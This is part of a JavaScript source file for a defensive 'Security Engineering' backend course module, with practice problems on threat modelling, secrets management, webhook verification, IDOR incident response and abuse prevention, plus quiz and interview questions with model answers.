  { lang: 'python', code: `from collections import deque\n\nclass SlidingWindow:\n    def __init__(self, n, window):\n        self.n, self.w, self.q = n, window, {}\n    def allow(self, key, t):\n        d = self.q.setdefault(key, deque())\n        while d and d[0] <= t - self.w:\n            d.popleft()\n        if len(d) < self.n:\n            d.append(t)\n            return True\n        return False\n\nr = SlidingWindow(3, 1000)\nprint([r.allow('k', t) for t in [0, 100, 200, 300, 1000]])` }));

practice.push(P('Threat-Model a Password Reset and OAuth Login', 'Hard', ['threat modeling', 'stride'],
  `<p>Run a STRIDE threat model for a product that supports email+password login with reset, plus "Sign in with Google" (OAuth/OIDC). Produce the data-flow trust boundaries, top threats and mitigations.</p>`,
  `Web app + API + email provider + identity provider; 1M users.`,
  `<p>Example: ${H.c('r', 'Spoofing - attacker registers victim email first, then victim signs in with Google')} -> ${H.c('g', 'link accounts only after verified email, require re-auth to link')}.</p>`,
  `<p>List only generic risks (XSS, SQLi) without tying them to the actual flows, trust boundaries, or login/reset/linking steps.</p>`,
  { q: 'Which OAuth parameter protects against CSRF on the callback?', options: ['scope', 'state', 'nonce only', 'redirect_uri length'], answer: 1, explain: 'A random state tied to the session proves the callback belongs to the flow this browser started.' },
  [`<p>Hint 1: draw browser, app, API, email provider, IdP; mark trust boundaries.</p>`, `<p>Hint 2: apply STRIDE to each arrow; OAuth specifics are state, PKCE, redirect URI, ID token validation, account linking.</p>`, `<p>Hint 3: rank by likelihood x impact and name a test per mitigation.</p>`],
  `<p>Boundaries: browser to app (untrusted), app to IdP and email provider (third party). Spoofing: credential stuffing (rate limits, breached-password check, MFA), phishing (passkeys), account pre-hijacking and unverified-email linking (link only on verified email and require re-authentication), forged ID tokens (validate signature, issuer, audience, expiry, nonce). Tampering: open redirect or redirect_uri manipulation (exact-match registered URIs), authorization code interception (PKCE, state for CSRF). Repudiation: log login, reset, link, MFA changes with request id. Information disclosure: enumeration through reset and login messages (generic answers), tokens in URLs and referrers, verbose errors. Denial of service: reset-email flooding (rate limits per account and IP), lockout abuse (throttling instead of hard lock). Elevation: reset token reuse or weak tokens (random 128-bit, hashed, single use, short expiry), session fixation (rotate session on login), mass assignment on profile. Controls shared: secure cookies, short sessions with rotation, step-up authentication for sensitive changes, and monitoring of impossible-travel logins. Verify with tests: tamper with state, replay codes, reuse reset links, link accounts with an unverified email.</p>`,
  `<p>Qualitative output; effort is in coverage of each flow.</p>`, ['How would passkeys change the model?'], null));

practice.push(P('Design Secrets Management for 200 Microservices', 'Hard', ['secrets', 'vault', 'architecture'],
  `<p>Design the secrets platform: how services authenticate to it, what kinds of secrets (static and dynamic), rotation, audit, local development, and disaster recovery.</p>`,
  `Kubernetes plus a few VMs; AWS; PCI scope; zero downtime rotation required.`,
  `<p>Service starts, proves identity (service account token), receives a ${H.c('g', '1-hour database credential')} that no human ever sees.</p>`,
  `<p>One shared .env file distributed through chat and copied into images; rotation means a company-wide outage week.</p>`,
  { q: 'What best removes the "initial secret" problem?', options: ['A password in the image', 'Platform-attested workload identity', 'Email', 'Hard-coded key in config'], answer: 1, explain: 'Identity attested by the platform (service account/IAM role) needs no stored bootstrap secret.' },
  [`<p>Hint 1: how does a service prove who it is without already holding a secret?</p>`, `<p>Hint 2: dynamic, short-lived credentials generated on demand beat static ones.</p>`, `<p>Hint 3: audit every read; plan for vault outage and recovery.</p>`],
  `<p>Identity: workloads authenticate with platform-attested identity (Kubernetes service-account JWT validated by Vault, or an AWS IAM role), mapped to a policy limited to that service's paths; no bootstrap password exists. Secret types: dynamic database credentials (Vault database engine creates a user per instance with a TTL of one hour and revokes it), cloud access through IAM roles/STS (no keys at all), a transit/KMS engine for encryption so apps never hold encryption keys, PKI engine for mTLS certificates, and static secrets (third-party API keys) stored in KV v2 with versions and rotated by a scheduled job or provider API. Delivery: a sidecar or CSI driver renders secrets into memory-backed files and refreshes them; apps reload without restart. Rotation: dual-credential overlap or dynamic leases; static keys rotate every 30-90 days, immediately on suspicion. Audit: every read and policy change goes to an append-only sink with alerts on unusual access. Dev: separate dev vault with fake data, never production secrets on laptops; pre-commit scanning. Reliability: HA cluster across zones, auto-unseal through KMS, cached leases so brief outages do not break services, performance replicas, tested disaster recovery with Raft snapshots stored encrypted off-site, and break-glass procedure with split approvals. Governance: ownership per path, quarterly access review, PCI evidence from audit logs.</p>`,
  `<p>Not algorithmic; capacity planned from lease renewals per minute.</p>`, ['What happens during a vault outage?'], null));

practice.push(P('Secure a Webhook Receiver', 'Hard', ['integrity', 'webhooks', 'replay'],
  `<p>Your API accepts webhooks from a payment provider. Design verification so forged, replayed, or modified requests are rejected, including secret rotation and idempotency.</p>`,
  `Public endpoint; provider signs with HMAC-SHA256; duplicates and retries occur.`,
  `<p>Forged body ${H.c('r', 'signature mismatch -> 401')}; replay of a valid request after 10 minutes ${H.c('r', 'timestamp too old -> 400')}.</p>`,
  `<p>Trust any POST that comes from the provider's IP range, or parse JSON first and compare a header token with ==.</p>`,
  { q: 'What must be signed so the body cannot be modified?', options: ['Only the header', 'The exact raw request body (plus timestamp)', 'Only the URL', 'The IP address'], answer: 1, explain: 'Verify the HMAC over the raw bytes you received before parsing, together with the timestamp.' },
  [`<p>Hint 1: authenticate the message, not the network location.</p>`, `<p>Hint 2: HMAC of timestamp + raw body, constant-time compare, short tolerance window.</p>`, `<p>Hint 3: store processed event ids so retries and replays do nothing twice.</p>`],
  `<p>Process: read the raw body bytes (before any JSON parsing or re-serialization); read the timestamp and signature headers; reject if the timestamp is older than 5 minutes or in the future beyond a small skew; compute HMAC-SHA256 over timestamp + "." + body with the shared secret and compare using a constant-time function; reject with 401 on mismatch and do not leak why. Support rotation by accepting a list of active secrets (new and old) during an overlap period, and let the provider send multiple signatures. After authentication, enforce idempotency: store event id with a unique constraint and a processed flag in the same transaction as the business effect, so a retry returns 200 without repeating the action. Return 2xx quickly and process asynchronously through a queue, so provider timeouts do not trigger storms of retries. Validate the payload schema, never trust amounts from the webhook alone for high-risk actions (fetch the object from the provider API by id, using your own credentials), cap body size, rate limit by IP as a coarse filter, and log verification failures for alerting. Use TLS only. The secret lives in the secrets manager.</p>`,
  `<p>O(body size) for the HMAC; O(1) idempotency lookup.</p>`, ['Why is an IP allow-list alone insufficient?'], null));

practice.push(P('Contain and Investigate a Suspected IDOR Exploitation', 'Hard', ['incident response', 'idor', 'audit'],
  `<p>Support reports a customer saw another customer's invoice. Logs show one account requested 40,000 sequential invoice ids last night. Write the incident response plan: contain, scope, fix, communicate, prevent.</p>`,
  `Access logs retained 30 days; audit log lacks per-object reads; GDPR notification duties apply.`,
  `<p>Pattern: ${H.c('r', 'GET /invoices/1 ... /invoices/40000 with 200 for most')} from one session.</p>`,
  `<p>Fix the bug silently and move on without scoping which invoices were exposed or whether anyone else did the same earlier.</p>`,
  { q: 'What tells you which data was exposed?', options: ['Developer memory', 'Access logs of 200 responses by invoice id and owner', 'The bug report text', 'CPU graphs'], answer: 1, explain: 'Join successful responses to invoice owners to enumerate who was affected.' },
  [`<p>Hint 1: stop the bleeding first, then measure the impact.</p>`, `<p>Hint 2: join access logs (user, id, status) with invoice ownership to find cross-account reads.</p>`, `<p>Hint 3: deploy the scoped-query fix, test it, and extend logging so you can answer this faster next time.</p>`],
  `<p>Contain: immediately block or suspend the abusing account and session tokens, add a temporary gateway rule or feature flag that requires owner match, and then deploy the real fix (scoped query by owner, 404 on mismatch) after review and a negative test. Preserve evidence (copy logs to a restricted bucket). Scope: from access logs extract all requests where status was 200 and the invoice owner differs from the session user, over the full retention window and beyond (look for earlier use of the same bug in backups or CDN logs); count affected customers, data fields exposed, and time window; check whether the actor used other endpoints or exported data; identify the origin (new account, credential stuffing, insider). Communicate: involve legal and privacy officers early; determine regulatory deadlines (for GDPR, notify the authority within 72 hours of becoming aware if risk to people exists); prepare customer notices stating what happened and what to do. Fix and prevent: review sibling endpoints for the same pattern, add automated authorization tests per endpoint, enable row-level security or shared scoped repository, add alerts on enumeration (many distinct ids per session, many 404/403), add object-level audit logging for sensitive reads, rate limits per session, and run a blameless post-mortem with action items and owners.</p>`,
  `<p>Analysis is a join over log data; cost depends on log volume.</p>`, ['What if logs were already deleted?'], null));

practice.push(P('Design an Abuse-Resistant Public API with Quotas and Bot Defence', 'Hard', ['abuse prevention', 'architecture', 'rate limiting'],
  `<p>Design the abuse prevention layers for a public signup + API product: free tier abused by bots creating thousands of accounts and scraping, paid customers must not be affected.</p>`,
  `Millions of requests/hour; mixed human and machine clients; GDPR; limited false positives.`,
  `<p>Layers: ${H.c('b', 'edge/WAF')} then ${H.c('g', 'per-key quotas')} then ${H.c('y', 'risk scoring')} then ${H.c('p', 'manual review')}.</p>`,
  `<p>A single IP rate limit. Botnets and residential proxies rotate addresses, and shared offices get blocked.</p>`,
  { q: 'Which is the most robust signal for per-user limits?', options: ['IP address alone', 'Authenticated account/API key combined with behavior signals', 'User agent string', 'Time of day'], answer: 1, explain: 'Identity is harder to rotate than IPs; combining it with behavior reduces false positives.' },
  [`<p>Hint 1: one defence will fail; stack cheap layers before expensive ones.</p>`, `<p>Hint 2: edge filtering, signup friction, per-key quotas, behavior scoring, enforcement ladder.</p>`, `<p>Hint 3: measure false positives and give appeals; cost-aware limits for expensive endpoints.</p>`],
  `<p>Layer 1, edge: CDN/WAF with managed bot rules, IP and ASN reputation, TLS and header fingerprinting, and volumetric DDoS protection. Layer 2, signup: email verification, disposable-domain detection, per-IP and per-device signup limits, proof-of-work or Turnstile-type challenge for risky sessions, phone verification for higher quotas. Layer 3, API: per-key token buckets plus daily quotas by plan, endpoint cost weights, concurrency caps, and per-account limits independent of IP. Layer 4, behavior: features such as request cadence, sequential id walking, user-agent entropy, geo velocity, success/error ratios feed a risk score; scores drive actions on a ladder: allow, slow down (tarpit/delay), challenge, reduce quota, suspend with review. Layer 5, data: canary or honeypot records that no human would request, watermarking of responses to trace scrapers, and pagination caps. Operations: dashboards for blocks, false positive reviews, appeal path, allow-lists for verified partners, kill switch per rule, shadow mode before enforcement. Business: price expensive endpoints, require payment method for high quotas. Privacy: minimise fingerprint data, document retention. Test with simulated attacker traffic and track precision/recall.</p>`,
  `<p>Edge checks are O(1); scoring runs on streaming aggregates.</p>`, ['How do you measure false positives?'], null));

/* =========================================================
   QUIZ (12)
   ========================================================= */
quiz.push({ q: 'A logged-in user changes <code>/orders/17</code> to <code>/orders/18</code> and sees another customer\'s order. This is:', options: ['SQL injection', 'IDOR / broken object-level authorization', 'XSS', 'SSRF'], answer: 1, explain: 'The server authenticated the user but did not check that order 18 belongs to them.' });
quiz.push({ q: 'Which change fixes IDOR?', options: ['Use UUIDs only', 'Hide the link in the UI', 'Scope the query by the authenticated owner', 'Add CAPTCHA'], answer: 2, explain: 'Authorization on the server, e.g. WHERE id = ? AND owner_id = ?, is the fix; UUIDs only hinder guessing.' });
quiz.push({ q: 'What stops SQL injection for values?', options: ['Blocking the word DROP', 'Parameterized queries', 'Client-side validation', 'HTTPS'], answer: 1, explain: 'Bound parameters are sent as data, so they cannot change query structure.' });
quiz.push({ q: 'You need to sort by a column name chosen by the user. Best approach?', options: ['Bind it as a ? parameter', 'Concatenate after escaping quotes', 'Map allowed keys to real column names (allow-list)', 'Use LIKE'], answer: 2, explain: 'Identifiers cannot be bound; an allow-list map is safe.' });
quiz.push({ q: 'Why is an allow-list better than a block-list for validation?', options: ['It is shorter', 'You define exactly what is valid; unknown tricks are rejected by default', 'It is faster', 'It encrypts input'], answer: 1, explain: 'Attackers invent inputs you did not list; allow-lists fail closed.' });
quiz.push({ q: 'Which address is the cloud metadata service commonly used in SSRF attacks?', options: ['8.8.8.8', '169.254.169.254', '192.0.2.1', '255.255.255.255'], answer: 1, explain: 'The link-local address 169.254.169.254 serves instance metadata and credentials on major clouds.' });
quiz.push({ q: 'A leaked API key was removed from git history. What else is required?', options: ['Nothing', 'Rotate/revoke the key', 'Make the repo private only', 'Rename the file'], answer: 1, explain: 'Copies may exist; only revoking makes the key useless.' });
quiz.push({ q: 'What does mTLS add compared to TLS?', options: ['Compression', 'The client also presents and proves a certificate', 'Faster handshake', 'DNS security'], answer: 1, explain: 'Mutual TLS authenticates both ends, giving services a verified identity.' });
quiz.push({ q: 'Which best describes zero trust?', options: ['Trust the VPN', 'Verify every request regardless of network location', 'Block all traffic', 'Use only passwords'], answer: 1, explain: 'Identity, device, policy and context are evaluated per request; location is not trust.' });
quiz.push({ q: 'Fixed-window rate limiting weakness?', options: ['Needs GPUs', 'Allows up to double the limit around a window boundary', 'Cannot count', 'Only works with IPv6'], answer: 1, explain: 'A client can send a full limit at the end of one window and again at the start of the next.' });
quiz.push({ q: 'What makes an audit log tamper-evident?', options: ['Larger disks', 'Each entry includes the hash of the previous one', 'Sorting by time', 'Compression'], answer: 1, explain: 'Changing any entry breaks all later hashes, revealing tampering.' });
quiz.push({ q: 'A coding assistant suggests <code>pip install</code> of a package you have never heard of. First step?', options: ['Install it immediately', 'Verify the package exists, its maintainers and downloads (slopsquatting risk)', 'Disable TLS', 'Ignore the lockfile'], answer: 1, explain: 'AI can hallucinate names that attackers then register with malware.' });

/* =========================================================
   INTERVIEW (14)
   ========================================================= */
interview.push({ level: 'B', q: 'What is the difference between authentication and authorization, and which one does IDOR break?', a: `<p><b>Authentication</b> proves who you are (login, token). <b>Authorization</b> decides what that identity may do to which resource. IDOR is an <b>authorization</b> failure: the user is properly logged in, but the server does not verify that the requested object belongs to them. Fix by scoping every lookup with the session's user or tenant id, deny by default, return 404 for foreign objects and add negative tests with two users.</p>`, followUps: ['Why do UUIDs not fix it?', 'Where would you centralize the check?'] });
interview.push({ level: 'B', q: 'How do you prevent SQL injection?', a: `<p>Use <b>parameterized queries</b> (PreparedStatement, named parameters in the ORM) so values travel separately from SQL text. Allow-list anything that cannot be a parameter (column names, sort direction). Validate inputs as a second layer, use a least-privilege database account, avoid dynamic SQL in stored procedures, and hide SQL errors from users. Add static analysis to CI that flags string-built queries. Escaping by hand and block-lists are fragile and not an acceptable primary defence.</p>`, followUps: ['Can ORMs be injectable?', 'How do you handle dynamic ORDER BY?'] });
interview.push({ level: 'B', q: 'Where do you store secrets and why not in git?', a: `<p>Secrets live in a <b>secrets manager</b> (Vault, AWS/GCP/Azure) or are injected as environment variables or mounted files at deploy time, never in source or images. Git keeps history forever and every clone, fork and CI log can leak it. Use per-service least-privilege secrets, rotation, audit logs, and secret scanning (pre-commit and push protection). Best of all, avoid static secrets by using workload identity so credentials are short-lived and issued automatically.</p>`, followUps: ['What do you do when a secret leaks?', 'Are environment variables safe enough?'] });
interview.push({ level: 'I', q: 'Explain SSRF and how you would defend a "fetch this URL" feature.', a: `<p>SSRF makes the server issue requests to a destination the attacker picks, reaching internal services or the cloud metadata endpoint at 169.254.169.254. Defence in layers: prefer a destination allow-list; otherwise allow only http(s) on 80/443, parse with a real URL parser, resolve DNS, reject loopback, private, link-local, multicast and unique-local IPs, connect to the validated IP (anti-rebinding), handle redirects per hop, limit size and time, isolate the fetcher with egress firewall rules, use IMDSv2 with hop limit 1, and alert on blocked attempts.</p>`, followUps: ['How does DNS rebinding work?', 'Why do string blocklists fail?'] });
interview.push({ level: 'I', q: 'Walk through a TLS 1.3 handshake. What does mTLS change?', a: `<p>ClientHello (ciphers, key share, SNI) then ServerHello (chosen cipher, key share); both derive session keys with ephemeral ECDHE, giving forward secrecy, and the rest is encrypted. The server sends its certificate chain and a CertificateVerify signature; the client validates the chain, hostname and dates; both send Finished, and application data flows after one round trip. With <b>mTLS</b> the server also sends a CertificateRequest, and the client presents its own certificate and proof of key possession, which the server validates against a trusted CA and maps to an identity for authorization.</p>`, followUps: ['What is forward secrecy?', 'How do you rotate certificates without downtime?'] });
interview.push({ level: 'I', q: 'What is zero trust and how would you apply it to microservices?', a: `<p>Zero trust means no implicit trust from network location; every request is authenticated, authorized and logged. For microservices: workload identity (SPIFFE), mTLS between services, default-deny network policies, authorization policies by caller identity and operation, least-privilege service accounts, short-lived credentials from a vault, and central policy with local enforcement. Also user-facing: SSO with phishing-resistant MFA, device posture checks and step-up for risky actions, with detailed audit logs and anomaly detection. Roll out gradually using observe mode first.</p>`, followUps: ['What is the failure mode of a central policy service?', 'How do you handle legacy services?'] });
interview.push({ level: 'I', q: 'Design a rate limiter. Which algorithm and why?', a: `<p>Choose by need: <b>token bucket</b> allows bursts with a capped average and is the common API choice; <b>sliding window</b> is exact and avoids boundary spikes; fixed window is simplest but allows 2x at boundaries. Key by API key/user, IP for anonymous traffic, and by target account for logins. Keep state in Redis updated atomically via Lua, use Redis time, return 429 with Retry-After and RateLimit headers, define fail-open or fail-closed per route, and layer limits at the edge, gateway and service. Add cost weights for expensive endpoints.</p>`, followUps: ['How do you rate limit a distributed system without a central store?', 'How do you defend against rotating IPs?'] });
interview.push({ level: 'I', q: 'How do you store passwords and why not SHA-256?', a: `<p>Use a slow, memory-hard, salted password hash: <b>Argon2id</b> (or scrypt/bcrypt) with a unique random salt per user and tuned cost, storing parameters with the hash so you can upgrade later; compare in constant time. SHA-256 is designed to be fast, so GPUs test billions of guesses per second; salts stop rainbow tables but not fast brute force. Add MFA, breached-password checks, rate limits and optionally a pepper kept in an HSM or KMS.</p>`, followUps: ['What is a pepper?', 'How do you migrate old MD5 hashes?'] });
interview.push({ level: 'I', q: 'A critical CVE is announced in a library you might use. What is your process?', a: `<p>Inventory first: query stored SBOMs and runtime inventory for affected versions, including transitive dependencies. Triage by exposure and untrusted input. Mitigate immediately (WAF rule, disable feature, restrict egress) if a patch is not ready, then upgrade or override the transitive version, rebuild with updated lockfiles, test, and deploy exposed services first. Verify by rescanning running images, check logs for earlier exploitation, and close only when no vulnerable instance remains. Afterwards improve CI scanning, update automation and track time-to-patch.</p>`, followUps: ['How do you deal with a library with no fix?', 'What is reachability analysis?'] });
interview.push({ level: 'A', q: 'How would you build tamper-evident audit logs that survive a compromised admin?', a: `<p>Make the application a write-only producer into a separate audit service with append-only storage. Chain entries (hash of the previous entry plus canonical content, with sequence numbers), sign or HMAC the chain head with a key held in KMS/HSM the app cannot export, and publish signed checkpoints to a separate account with WORM retention (S3 Object Lock) or a transparency log. A verifier job recomputes chains and checks checkpoints, catching edits, deletions and truncation. Handle GDPR with crypto-shredding of encrypted PII, alert on log silence and verification failures.</p>`, followUps: ['Why is a bare hash chain insufficient?', 'What does a Merkle tree add?'] });
interview.push({ level: 'A', q: 'Describe dependency confusion and how to defend your build.', a: `<p>If a build resolves an internal package name from a public registry that has a higher version, an attacker can publish a malicious package with your internal name and have your CI install it. Defend with scoped/namespaced packages, registry configuration that maps internal names only to the private registry, a proxy registry that blocks unknown public packages, lockfiles with integrity hashes, reserving names publicly, install-script restrictions, and egress controls plus least-privilege secrets in CI so a compromised install cannot steal much.</p>`, followUps: ['What is typosquatting?', 'How do you verify build provenance?'] });
interview.push({ level: 'A', q: 'How do you threat-model a new feature quickly?', a: `<p>Draw a data-flow diagram with actors, processes, stores and trust boundaries. For each element or flow apply STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege), write abuse cases, rate by likelihood and impact, choose mitigations (preventive, detective, corrective), assign owners, and turn each into a test or monitoring rule. Keep it lightweight (an hour of whiteboarding with engineers and security), store it with the design doc, and revisit when the architecture changes.</p>`, followUps: ['How is STRIDE different from attack trees?', 'How would you threat-model a file upload?'] });
interview.push({ level: 'E', q: 'How do AI agents change your security model?', a: `<p>Agents mix instructions and data in one channel, so prompt injection from documents or web pages can steer them. Treat model output as untrusted input: validate and allow-list tool arguments, never pass output to shells or raw SQL, and enforce authorization on the tool side with the end user's permissions (on-behalf-of tokens), not a broad service account. Give agents their own identity, least-privilege tools, egress controls, budgets and rate limits, human approval for destructive actions, and full audit logging of prompts, tool calls and decisions with PII redaction. Also secure the AI supply chain: pinned models and MCP servers.</p>`, followUps: ['What is slopsquatting?', 'How do you prevent data exfiltration through an agent?'] });
interview.push({ level: 'E', q: 'You are the security lead for a 200-service platform. What are your first 90 days priorities?', a: `<p>Days 1-30: inventory (services, data classification, internet exposure, dependencies via SBOM), quick wins (MFA everywhere, secret scanning with rotation of found secrets, patch internet-facing criticals, central logging). Days 30-60: paved roads (standard auth library and policy engine, secrets manager with workload identity, hardened base images, CI gates for SAST/SCA/IaC), threat models for the top five systems, default-deny network policy pilots. Days 60-90: mTLS rollout in observe mode, audit logging standard with integrity, incident response drills, metrics (time-to-patch, coverage), and a security champions programme. Prioritise by risk and make the secure path the easy path.</p>`, followUps: ['How do you measure progress?', 'How do you get product teams to adopt it?'] });

registerModule({
  id: 'be15',
  title: 'Security Engineering',
  intro: `<p>This module teaches how backend systems get attacked and how to build them so they hold up. We go through the OWASP Top 10 in depth (access control and IDOR, injection, crypto and auth failures, insecure design, misconfiguration, vulnerable components, integrity failures, logging failures and SSRF), then the engineering practices that make security routine: allow-list validation, secrets management and rotation, TLS and mTLS, zero trust, rate limiting, supply-chain security and tamper-evident audit logs. Everything is defensive: every vulnerable example sits next to its fix, with runnable code, visual walk-throughs and interview-style practice.</p>`,
  goals: [
    'Find and fix IDOR, injection, SSRF and misconfiguration bugs, and explain the root cause of each in one sentence',
    'Validate input with allow-lists and use parameterized queries and safe command execution',
    'Run a secrets lifecycle: keep secrets out of code, load from a vault, rotate on schedule and after a leak',
    'Explain the TLS 1.3 handshake and design mTLS between services with identity-based authorization',
    'Design zero-trust request checks, rate limiters and abuse defences that fail safely',
    'Secure the software supply chain with SBOMs, pinning, scanning and signing',
    'Build tamper-evident, hash-chained audit logs and threat-model a feature such as a file upload'
  ],
  prereqs: `Backend basics: HTTP and REST APIs, databases and SQL, authentication basics (sessions, JWT, OAuth), and ideally the earlier Backend Engineering modules on APIs, databases and caching. Comfort reading short Java, Python and JavaScript snippets.`,
  hours: 14,
  topics: topics,
  practice: practice,
  quiz: quiz,
  interview: interview
}); })();
